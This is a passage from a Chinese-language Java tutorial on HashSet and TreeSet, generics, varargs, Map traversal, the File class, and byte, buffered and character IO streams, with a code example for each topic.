hashCode()</code>：返回对象的哈希码值。</li></ul><p>哈希值的特点：</p><ul><li>同一个对象多次调用<code>hashCode()</code>方法返回的哈希值是相同的。</li><li>默认情况下，不同对象的哈希值是不同的。而重写<code>hashCode()</code>方法，可以实现让不同对象的哈希值相同。</li></ul><p><strong>3、HashSet集合概述和特点</strong>：</p><p>HashSet集合的特点：</p><ul><li>底层数据结构是哈希表</li><li>对集合的迭代顺序不作任何保证，也就是说不保证存储和取出的元素顺序一致</li><li>没有带索引的方法，所以不能使用普通for循环遍历</li><li>由于是Set集合，所以是不包含重复元素的集合</li></ul><p>HashSet集合的基本使用：</p><pre><code class="java">public class HashSetDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        HashSet&lt;String&gt; hs = new HashSet&lt;String&gt;();        //添加元素        hs.add(&quot;hello&quot;);        hs.add(&quot;world&quot;);        hs.add(&quot;java&quot;);        hs.add(&quot;world&quot;);        //遍历        for(String s : hs) &#123;            System.out.println(s);        &#125;    &#125;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200828233603190.png#pic_center"></p><p><strong>4、HashSet集合存储学生对象并遍历</strong>：</p><p>案例需求     ：</p><ul><li>创建一个存储学生对象的集合，存储多个学生对象，使用程序实现在控制台遍历该集合。</li><li>要求：学生对象的成员变量值相同，我们就认为是同一个对象。</li></ul><p>代码实现：</p><ul><li><p>学生类</p><pre><code class="java">public class Student &#123;  private String name;  private int age;  public Student() &#123;  &#125;  public Student(String name, int age) &#123;      this.name = name;      this.age = age;  &#125;  public String getName() &#123;      return name;  &#125;  public void setName(String name) &#123;      this.name = name;  &#125;  public int getAge() &#123;      return age;  &#125;  public void setAge(int age) &#123;      this.age = age;  &#125;  @Override  public boolean equals(Object o) &#123;      if (this == o) return true;      if (o == null || getClass() != o.getClass()) return false;      Student student = (Student) o;      if (age != student.age) return false;      return name != null ? name.equals(student.name) : student.name ==      null;  &#125;  @Override  public int hashCode() &#123;      int result = name != null ? name.hashCode() : 0;      result = 31 * result + age;      return result;  &#125;&#125;</code></pre></li><li><p>测试类：</p></li></ul><pre><code class="java">public class HashSetDemo02 &#123;    public static void main(String[] args) &#123;        //创建HashSet集合对象        HashSet&lt;Student&gt; hs = new HashSet&lt;Student&gt;();        //创建学生对象        Student s1 = new Student(&quot;林青霞&quot;, 30);        Student s2 = new Student(&quot;张曼玉&quot;, 35);        Student s3 = new Student(&quot;王祖贤&quot;, 33);        Student s4 = new Student(&quot;王祖贤&quot;, 33);        //把学生添加到集合        hs.add(s1);        hs.add(s2);        hs.add(s3);        hs.add(s4);        //遍历集合(增强for)        for (Student s : hs) &#123;            System.out.println(s.getName() + &quot;,&quot; + s.getAge());        &#125;    &#125;&#125;</code></pre><hr><h4 id="16、Set集合排序"><a href="#16、Set集合排序" class="headerlink" title="16、Set集合排序"></a>16、Set集合排序</h4><p><strong>1、TreeSet集合概述和特点</strong>：</p><p>TreeSet集合概述：</p><ol><li>元素有序，可以按照一定的规则进行排序，具体排序方式取决于构造方法。</li></ol><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>TreeSet()</code>：根据其元素的自然排序进行排序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>TreeSet(Comparator comparator)</code> ：根据指定的比较器进行排序。</p><ol start="2"><li> 没有带索引的方法，所以不能使用普通for循环遍历。</li><li>由于是Set集合，所以不包含重复元素的集合。</li></ol><p>TreeSet集合基本使用：</p><pre><code class="java">public class TreeSetDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        TreeSet&lt;Integer&gt; ts = new TreeSet&lt;Integer&gt;();        //添加元素        ts.add(10);        ts.add(40);        ts.add(30);        ts.add(50);        ts.add(20);        ts.add(30);        //遍历集合        for(Integer i : ts) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200829232048111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>2、自然排序Comparable</strong>：</p><p>案例需求：</p><ul><li>存储学生对象并遍历，创建TreeSet集合使用带参构造方法</li><li>要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序</li></ul><p>代码实现：</p><ul><li>学生类：</li></ul><pre><code class="java">public class Student implements Comparable&lt;Student&gt; &#123;    private String name;    private int age;    public Student() &#123;    &#125;    public Student(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    @Override    public int compareTo(Student s) &#123;        // return 0;        // return 1;        // return -1;        //按照年龄从小到大排序        int num = this.age - s.age;        // int num = s.age - this.age;        //年龄相同时，按照姓名的字母顺序排序        int num2 = num==0?this.name.compareTo(s.name):num;        return num2;    &#125;&#125;</code></pre><ul><li>测试类：</li></ul><pre><code class="java">public class TreeSetDemo02 &#123;    public static void main(String[] args) &#123;        //创建集合对象        TreeSet&lt;Student&gt; ts = new TreeSet&lt;Student&gt;();        //创建学生对象        Student s1 = new Student(&quot;xishi&quot;, 29);        Student s2 = new Student(&quot;wangzhaojun&quot;, 28);        Student s3 = new Student(&quot;diaochan&quot;, 30);        Student s4 = new Student(&quot;yangyuhuan&quot;, 33);        Student s5 = new Student(&quot;linqingxia&quot;,33);        Student s6 = new Student(&quot;linqingxia&quot;,33);        //把学生添加到集合        ts.add(s1);        ts.add(s2);        ts.add(s3);        ts.add(s4);        ts.add(s5);        ts.add(s6);        //遍历集合        for (Student s : ts) &#123;            System.out.println(s.getName() + &quot;,&quot; + s.getAge());        &#125;    &#125;&#125;</code></pre><p><strong>3、比较器排序Comparator</strong>：</p><p>案例需求：</p><ul><li>存储学生对象并遍历，创建TreeSet集合使用带参构造方法。</li><li>要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序。</li></ul><p>代码实现：</p><ul><li>学生类：</li></ul><pre><code class="java">public class Student &#123;    private String name;    private int age;    public Student() &#123;    &#125;    public Student(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;</code></pre><ul><li>测试类</li></ul><pre><code class="java">public class TreeSetDemo &#123;    public static void main(String[] args) &#123;    //创建集合对象        TreeSet&lt;Student&gt; ts = new TreeSet&lt;Student&gt;(new Comparator&lt;Student&gt;() &#123;        @Override        public int compare(Student s1, Student s2) &#123;        //this.age - s.age        //s1,s2        int num = s1.getAge() - s2.getAge();        int num2 = num == 0 ? s1.getName().compareTo(s2.getName()): num;        return num2;        &#125;    &#125;);        //创建学生对象        Student s1 = new Student(&quot;xishi&quot;, 29);        Student s2 = new Student(&quot;wangzhaojun&quot;, 28);        Student s3 = new Student(&quot;diaochan&quot;, 30);        Student s4 = new Student(&quot;yangyuhuan&quot;, 33);        Student s5 = new Student(&quot;linqingxia&quot;,33);        Student s6 = new Student(&quot;linqingxia&quot;,33);        //把学生添加到集合        ts.add(s1);        ts.add(s2);        ts.add(s3);        ts.add(s4);        ts.add(s5);        ts.add(s6);        //遍历集合        for (Student s : ts) &#123;            System.out.println(s.getName() + &quot;,&quot; + s.getAge());        &#125;    &#125;&#125;</code></pre><hr><h4 id="17、泛型"><a href="#17、泛型" class="headerlink" title="17、泛型"></a>17、泛型</h4><p><strong>1、泛型类</strong>：</p><p>定义格式：</p><pre><code class="java">修饰符 class 类名&lt;类型&gt; &#123; &#125;</code></pre><p>此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型</p><p>示例代码：</p><p>泛型类：</p><pre><code class="java">public class Generic&lt;T&gt; &#123;    private T t;    public T getT() &#123;        return t;    &#125;    public void setT(T t) &#123;        this.t = t;    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class GenericDemo &#123;    public static void main(String[] args) &#123;        Generic&lt;String&gt; g1 = new Generic&lt;String&gt;();        g1.setT(&quot;林青霞&quot;);        System.out.println(g1.getT());        Generic&lt;Integer&gt; g2 = new Generic&lt;Integer&gt;();        g2.setT(30);        System.out.println(g2.getT());        Generic&lt;Boolean&gt; g3 = new Generic&lt;Boolean&gt;();        g3.setT(true);        System.out.println(g3.getT());    &#125;&#125;</code></pre><p><strong>2、泛型方法</strong>：</p><p>定义格式：</p><pre><code class="java">修饰符 &lt;类型&gt; 返回值类型 方法名(类型 变量名) &#123; &#125;</code></pre><p>示例代码：</p><p>带有泛型方法的类：</p><pre><code class="java">public class Generic &#123;    public &lt;T&gt; void show(T t) &#123;        System.out.println(t);    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class GenericDemo &#123;    public static void main(String[] args) &#123;        Generic g = new Generic();        g.show(&quot;林青霞&quot;);        g.show(30);        g.show(true);        g.show(12.34);    &#125;&#125;</code></pre><p><strong>3、泛型接口</strong>：</p><p>定义格式：</p><pre><code class="java">修饰符 interface 接口名&lt;类型&gt; &#123; &#125;</code></pre><p>示例代码：</p><p>泛型接口：</p><pre><code class="java">public interface Generic&lt;T&gt; &#123;    void show(T t);&#125;</code></pre><p>泛型接口实现类：</p><pre><code class="java">public class GenericImpl&lt;T&gt; implements Generic&lt;T&gt; &#123;        @Override        public void show(T t) &#123;            System.out.println(t);    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class GenericDemo &#123;    public static void main(String[] args) &#123;        Generic&lt;String&gt; g1 = new GenericImpl&lt;String&gt;();        g1.show(&quot;林青霞&quot;);        Generic&lt;Integer&gt; g2 = new GenericImpl&lt;Integer&gt;();        g2.show(30);    &#125;&#125;</code></pre><h4 id="18、可变参数"><a href="#18、可变参数" class="headerlink" title="18、可变参数"></a>18、可变参数</h4><p>可变参数介绍：</p><ul><li>可变参数又称参数个数可变，用作方法的形参出现，那么方法参数个数就是可变的了。</li></ul><p>可变参数定义格式：</p><pre><code class="java"> 修饰符 返回值类型 方法名(数据类型… 变量名) &#123; &#125;</code></pre><p>可变参数的注意事项：</p><ul><li>这里的变量其实是一个数组</li><li>如果一个方法有多个参数，包含可变参数，可变参数要放在最后</li></ul><p>可变参数的基本使用：</p><p><img src="https://img-blog.csdnimg.cn/20200901225327217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="19、Map集合"><a href="#19、Map集合" class="headerlink" title="19、Map集合"></a>19、Map集合</h4><p><strong>1、Map集合概述和特点</strong>：</p><p>Map集合概述：</p><pre><code class="java">interface Map&lt;K,V&gt; K：键的类型；V：值的类型</code></pre><p>Map集合的特点：</p><ol><li>键值对映射关系</li><li>一个键对应一个值</li><li>键不能重复，值可以重复</li><li>元素存取无序</li></ol><p>Map集合的基本使用：</p><pre><code class="java">public class MapDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;();        //V put(K key, V value) 将指定的值与该映射中的指定键相关联        map.put(&quot;itheima001&quot;,&quot;林青霞&quot;);        map.put(&quot;itheima002&quot;,&quot;张曼玉&quot;);        map.put(&quot;itheima003&quot;,&quot;王祖贤&quot;);        map.put(&quot;itheima003&quot;,&quot;柳岩&quot;);//键值相同时会覆盖原来的元素        //输出集合对象        System.out.println(map);    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20200902130145858.png#pic_center"></p><p><strong>2、Map集合的基本功能</strong>：</p><p>方法介绍：</p><p><img src="https://img-blog.csdnimg.cn/20200902130025895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>3、Map集合的获取功能</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200902170720207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>4、Map集合的遍历</strong>：</p><p>方式一：</p><p>步骤分析:</p><ol><li>获取所有键的集合。用keySet()方法实现</li><li>遍历键的集合，获取到每一个键。用增强for实现</li><li>根据键去找值。用get(Object key)方法实现</li></ol><p>代码实现：</p><pre><code class="java">public class MapDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();        //添加元素        map.put(&quot;张无忌&quot;, &quot;赵敏&quot;);        map.put(&quot;郭靖&quot;, &quot;黄蓉&quot;);        map.put(&quot;杨过&quot;, &quot;小龙女&quot;);        //获取所有键的集合。用keySet()方法实现        Set&lt;String&gt; keySet = map.keySet();        //遍历键的集合，获取到每一个键。用增强for实现        for (String key : keySet) &#123;            //根据键去找值。用get(Object key)方法实现            String value = map.get(key);            System.out.println(key + &quot;,&quot; + value);        &#125;    &#125;&#125;</code></pre><p>方式二：</p><p>步骤分析：</p><ol><li><p>获取所有键值对对象的集合<br><code>Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code>：获取所有键值对对象的集合</p></li><li><p>遍历键值对对象的集合，得到每一个键值对对象<br>用增强for实现，得到每一个Map.Entry</p></li><li><p>根据键值对对象获取键和值<br>用<code>getKey()</code>得到键<br>用<code>getValue()</code>得到值</p></li></ol><p>例：</p><pre><code class="java">public class MapDemo02 &#123;    public static void main(String[] args) &#123;            //创建集合对象    Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();        //添加元素        map.put(&quot;张无忌&quot;, &quot;赵敏&quot;);        map.put(&quot;郭靖&quot;, &quot;黄蓉&quot;);        map.put(&quot;杨过&quot;, &quot;小龙女&quot;);        //获取所有键值对对象的集合        Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = map.entrySet();        //遍历键值对对象的集合，得到每一个键值对对象        for (Map.Entry&lt;String, String&gt; me : entrySet) &#123;            //根据键值对对象获取键和值            String key = me.getKey();            String value = me.getValue();            System.out.println(key + &quot;,&quot; + value);        &#125;    &#125;&#125;</code></pre><h4 id="20、Collections集合工具类"><a href="#20、Collections集合工具类" class="headerlink" title="20、Collections集合工具类"></a>20、Collections集合工具类</h4><p><strong>1、Collections概述和使用</strong>：</p><p>Collections类的作用：</p><ul><li>是针对集合操作的工具类</li></ul><p>Collections类常用方法：</p><p><img src="https://img-blog.csdnimg.cn/20200903222436345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><hr><h4 id="21、File类"><a href="#21、File类" class="headerlink" title="21、File类"></a>21、File类</h4><p><strong>1、File类概述和构造方法</strong>：</p><p>File类介绍：</p><ul><li>它是文件和目录路径名的抽象表示</li><li>文件和目录可以通过File封装成对象</li><li>对于File而言，其封装的并不是一个真正存在的文件，仅仅是一个路径名。它可以是存在的，也可以是不存在的。将来是要通过具体的操作把这个路径的内容转换为具体存在的。</li></ul><p>File类的构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200904223446621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>示例代码：</p><pre><code class="java">public class FileDemo01 &#123;    public static void main(String[] args) &#123;        //File(String pathname)：通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例。        File f1 = new File(&quot;E:\\itcast\\java.txt&quot;);        System.out.println(f1);        //File(String parent, String child)：从父路径名字符串和子路径名字符串创建新的File实例。        File f2 = new File(&quot;E:\\itcast&quot;,&quot;java.txt&quot;);        System.out.println(f2);        //File(File parent, String child)：从父抽象路径名和子路径名字符串创建新的 File实例。        File f3 = new File(&quot;E:\\itcast&quot;);        File f4 = new File(f3,&quot;java.txt&quot;);        System.out.println(f4);    &#125;&#125;</code></pre><p>其中File类重写了toString方法。</p><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/202009042242029.png#pic_center"></p><p><strong>2、File类创建功能</strong>：</p><p>方法分类：</p><p><img src="https://img-blog.csdnimg.cn/20200904225443493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>示例代码：</p><pre><code class="java">public class FileDemo02 &#123;    public static void main(String[] args) throws IOException &#123;        //需求1：我要在E:\\itcast目录下创建一个文件java.txt        File f1 = new File(&quot;E:\\itcast\\java.txt&quot;);        System.out.println(f1.createNewFile());//如果文件原本不存在，就创建文件，返回true，如果文件存在，不创建文件，返回false        System.out.println(&quot;--------&quot;);        //需求2：我要在E:\\itcast目录下创建一个目录JavaSE        File f2 = new File(&quot;E:\\itcast\\JavaSE&quot;);        System.out.println(f2.mkdir());//如果目录原本不存在，就创建目录，返回true；如果目录存在，不创建目录，返回false        System.out.println(&quot;--------&quot;);        //需求3：我要在E:\\itcast目录下创建一个多级目录JavaWEB\\HTML        File f3 = new File(&quot;E:\\itcast\\JavaWEB\\HTML&quot;);//         System.out.println(f3.mkdir());        System.out.println(f3.mkdirs());        System.out.println(&quot;--------&quot;);        //需求4：我要在E:\\itcast目录下创建一个文件javase.txt        File f4 = new File(&quot;E:\\itcast\\javase.txt&quot;);//         System.out.println(f4.mkdir());//会创建目录，而不是文件。        System.out.println(f4.createNewFile());    &#125;&#125;</code></pre><p><strong>3、File类判断和获取功能</strong>：</p><p>判断功能:</p><p><img src="https://img-blog.csdnimg.cn/20200905123203136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>获取功能：</p><p><img src="https://img-blog.csdnimg.cn/20200905123309250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>4、File类删除功能</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200905131618503.png#pic_center"><br>删除目录时的注意事项:</p><ul><li>如果一个目录中有内容(目录，文件)，不能直接删除。应该先删除目录中的内容，最后才能删除目录<hr></li></ul><h4 id="22、IO流"><a href="#22、IO流" class="headerlink" title="22、IO流"></a>22、IO流</h4><p><strong>1、IO流的分类</strong>：</p><p>按照数据类型来分：</p><p>1.字节流：</p><ul><li>字节输入流</li><li>字节输出流</li></ul><p>2.字符流：</p><ul><li>字符输入流</li><li>字符输出流</li></ul><p>IO流的使用场景;</p><ul><li>如果操作的是纯文本文件，优先使用字符流。</li><li>如果操作的是图片、视频、音频等二进制文件。优先使用字节流。</li><li>如果不确定文件类型，优先使用字节流。字节流是万能的流。</li></ul><p><strong>2、字节流写数据：</strong></p><p>字节流抽象基类：</p><ul><li>InputStream：这个抽象类是表示字节输入流的所有类的超类</li><li>OutputStream：这个抽象类是表示字节输出流的所有类的超类</li></ul><p>子类名特点：子类名称都是以其父类名作为子类名的后缀</p><p>字节输出流：</p><ul><li>FileOutputStream(String name)：创建文件输出流以指定的名称写入文件。</li></ul><p>使用字节输出流写数据的步骤：</p><ol><li>创建字节输出流对象(调用系统功能创建了文件，创建字节输出流对象，让字节输出流对象指向文件)</li><li>调用字节输出流对象的写数据方法</li><li>释放资源(关闭此文件输出流并释放与此流相关联的任何系统资源)</li></ol><p>示例代码：</p><pre><code class="java">public class FileOutputStreamDemo01 &#123;    public static void main(String[] args) throws IOException &#123;        //创建字节输出流对象        //FileOutputStream(String name)：创建文件输出流以指定的名称写入文件        FileOutputStream fos = new FileOutputStream(&quot;myByteStream\\fos.txt&quot;);        //void write(int b)：将指定的字节写入此文件输出流        fos.write(97);        // fos.write(57);        // fos.write(55);        //最后都要释放资源        //void close()：关闭此文件输出流并释放与此流相关联的任何系统资源。        fos.close();    &#125;&#125;</code></pre><p><strong>3、字节流写数据的三种方式</strong>：</p><p><img src="https://img-blog.csdnimg.cn/2020090712215021.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>4、字节流写数据加异常处理</strong>：</p><pre><code class="java">    try&#123;        可能出现异常的代码;    &#125;catch(异常类名 变量名)&#123;        异常的处理代码;    &#125;finally&#123;        执行所有清除操作;    &#125;</code></pre><p>finally特点：</p><ul><li>被finally控制的语句一定会执行，除非JVM退出。</li></ul><p>示例代码：</p><pre><code class="java">public class FileOutputStreamDemo04 &#123;    public static void main(String[] args) &#123;        //加入finally来实现释放资源        FileOutputStream fos = null;//初始化，保证fos.close能执行。        try &#123;            fos = new FileOutputStream(&quot;myByteStream\\fos.txt&quot;);            fos.write(&quot;hello&quot;.getBytes());        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125; finally &#123;            if(fos != null) &#123;                try &#123;                    fos.close();                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p><strong>5、字节流读数据：</strong></p><p>1、一次读一个字节数据：</p><p>字节输入流：</p><ul><li>FileInputStream(String name)：通过打开与实际文件的连接来创建一个FileInputStream ，该文件由文件系统中的路径名name命名。</li></ul><p>示例代码：</p><pre><code class="java">public class FileInputStreamDemo01 &#123;    public static void main(String[] args) throws IOException &#123;        //创建字节输入流对象        //FileInputStream(String name)        FileInputStream fis = new FileInputStream(&quot;myByteStream\\fos.txt&quot;);        int by;        /*        fis.read()：读数据        by=fis.read()：把读取到的数据赋值给by        by != -1：判断读取到的数据是否是-1        */        while ((by=fis.read())!=-1) &#123;            System.out.print((char)by);        &#125;        //释放资源        fis.close();    &#125;&#125;</code></pre><p>2、一次读一个字节数组数据：</p><p>一次读一个字节数组的方法：</p><ul><li>public int read(byte[] b)：从输入流读取最多b.length个字节的数据</li></ul><p>示例代码：</p><pre><code class="java">public class FileInputStreamDemo02 &#123;    public static void main(String[] args) throws IOException &#123;        //创建字节输入流对象        FileInputStream fis = new FileInputStream(&quot;myByteStream\\fos.txt&quot;);        /*            hello\r\n            world\r\n            第一次：hello            第二次：\r\nwor            第三次：ld\r\nr        */        byte[] bys = new byte[1024]; //1024及其整数倍        int len;        while ((len=fis.read(bys))!=-1) &#123;            System.out.print(new String(bys,0,len));        &#125;        //释放资源        fis.close();    &#125;&#125;</code></pre><p><strong>6、字节流复制文本文件</strong>：</p><p>案例需求</p><ul><li>把“E:\itcast\窗里窗外.txt”复制到模块目录下的“窗里窗外.txt”</li></ul><p>实现步骤:</p><ul><li><p> 复制文本文件，其实就把文本文件的内容从一个文件中读取出来(数据源)，然后写入到另一个文件中(目的地)</p></li><li><p>数据源：:<br>E:\itcast\窗里窗外.txt — 读数据 — InputStream — FileInputStream</p></li><li><p>目的地：<br>myByteStream\窗里窗外.txt — 写数据 — OutputStream — FileOutputStream</p></li></ul><p>代码实现：</p><pre><code class="java">public class CopyTxtDemo &#123;    public static void main(String[] args) throws IOException &#123;        //根据数据源创建字节输入流对象        FileInputStream fis = new FileInputStream(&quot;E:\\itcast\\窗里窗外.txt&quot;);        //根据目的地创建字节输出流对象        FileOutputStream fos = new FileOutputStream(&quot;myByteStream\\窗里窗外.txt&quot;);        //读写数据，复制文本文件(一次读取一个字节，一次写入一个字节)        int by;        while ((by=fis.read())!=-1) &#123;            fos.write(by);        &#125;        //释放资源        fos.close();        fis.close();    &#125;&#125;</code></pre><p><strong>7、字节流复制图片</strong>：</p><p>案例需求：</p><ul><li>把“E:\itcast\mn.jpg”复制到模块目录下的“mn.jpg”</li></ul><p>实现步骤：</p><ol><li>根据数据源创建字节输入流对象。</li><li>根据目的地创建字节输出流对象。</li><li> 读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组)</li><li> 释放资源</li></ol><p>代码实现：</p><pre><code class="java">public class CopyJpgDemo &#123;    public static void main(String[] args) throws IOException &#123;        //根据数据源创建字节输入流对象        FileInputStream fis = new FileInputStream(&quot;E:\\itcast\\mn.jpg&quot;);        //根据目的地创建字节输出流对象        FileOutputStream fos = new FileOutputStream(&quot;myByteStream\\mn.jpg&quot;);        //读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组)        byte[] bys = new byte[1024];        int len;        while ((len=fis.read(bys))!=-1) &#123;            fos.write(bys,0,len);        &#125;        //释放资源        fos.close();        fis.close();    &#125;&#125;</code></pre><h4 id="23、字节缓冲流"><a href="#23、字节缓冲流" class="headerlink" title="23、字节缓冲流"></a>23、字节缓冲流</h4><p><strong>1、字节缓冲流构造方法</strong>：</p><p>字节缓冲流构造方法：</p><ul><li><p>BufferOutputStream：该类实现缓冲输出流。 通过设置这样的输出流，应用程序可以向底层输出流写入字节，而不必为写入的每个字节导致底层系统的调用。</p></li><li><p>BufferedInputStream：创建BufferedInputStream将创建一个内部缓冲区数组。 当从流中读取或跳过字节时，内部缓冲区将根据需要从所包含的输入流中重新填充，一次很多字节。</p></li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200916165824311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>示例代码：</p><pre><code class="java">public class BufferStreamDemo &#123;    public static void main(String[] args) throws IOException &#123;        //字节缓冲输出流：BufferedOutputStream(OutputStream out)        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(&quot;myByteStream\\bos.txt&quot;));        //写数据        bos.write(&quot;hello\r\n&quot;.getBytes());        bos.write(&quot;world\r\n&quot;.getBytes());        //释放资源        bos.close();        //字节缓冲输入流：BufferedInputStream(InputStream in)        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(&quot;myByteStream\\bos.txt&quot;));        //一次读取一个字节数据        // int by;        // while ((by=bis.read())!=-1) &#123;        // System.out.print((char)by);        // &#125;        //一次读取一个字节数组数据        byte[] bys = new byte[1024];        int len;        while ((len=bis.read(bys))!=-1) &#123;            System.out.print(new String(bys,0,len));        &#125;        //释放资源        bis.close();    &#125;&#125;</code></pre><h4 id="24、字符流"><a href="#24、字符流" class="headerlink" title="24、字符流"></a>24、字符流</h4><p><strong>1、为什么会出现字符流</strong>：</p><p>字符流的介绍：</p><ul><li>由于字节流操作中文不是特别的方便，所以Java就提供字符流<br>字符流 = 字节流 + 编码表</li></ul><p>中文的字节存储方式：</p><ul><li>用字节流复制文本文件时，文本文件也会有中文，但是没有问题，原因是最终底层操作会自动进行字节拼接成中文。</li></ul><p><strong>2、字符串中的编码解码问题</strong>：</p><p>相关方法：</p><p><img src="https://img-blog.csdnimg.cn/20200917124320584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>代码演示：</p><pre><code class="java">public class StringDemo &#123;    public static void main(String[] args) throws UnsupportedEncodingException &#123;        //定义一个字符串        String s = &quot;中国&quot;;        //byte[] bys = s.getBytes(&quot;UTF-8&quot;); //[-28, -72, -83, -27, -101, -67]        byte[] bys = s.getBytes(&quot;GBK&quot;); //[-42, -48, -71, -6]        System.out.println(Arrays.toString(bys));        //String ss = new String(bys);        //String ss = new String(bys,&quot;UTF-8&quot;);        String ss = new String(bys,&quot;GBK&quot;);        System.out.println(ss);    &#125;&#125;</code></pre><p><strong>3、字符流中的编码解码问题</strong>：</p><p>字符流中和编码解码的两个类：</p><ul><li><p>InputStreamReader：是从字节流到字符流的桥梁，它读取字节，并使用指定的编码将其解码为字符<br>它使用的字符集可以由名称指定，也可以接受平台的默认字符集。</p></li><li><p>OutputStreamWriter：是从字符流到字节流的桥梁，使用指定的编码将写入的字符编码为字节它使用的字符集可以由名称指定，也可以接受平台的默认字符集。</p></li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200917195607516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>示例代码：</p><pre><code class="java">public class ConversionStreamDemo &#123;    public static void main(String[] args) throws IOException &#123;        //OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(&quot;myCharStream\\osw.txt&quot;));        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(&quot;myCharStream\\osw.txt&quot;),&quot;GBK&quot;);        osw.write(&quot;中国&quot;);        osw.close();        //InputStreamReader isr = new InputStreamReader(new FileInputStream(&quot;myCharStream\\osw.txt&quot;));        InputStreamReader isr = new InputStreamReader(new FileInputStream(&quot;myCharStream\\osw.txt&quot;),&quot;GBK&quot;);        //一次读取一个字符数据        int 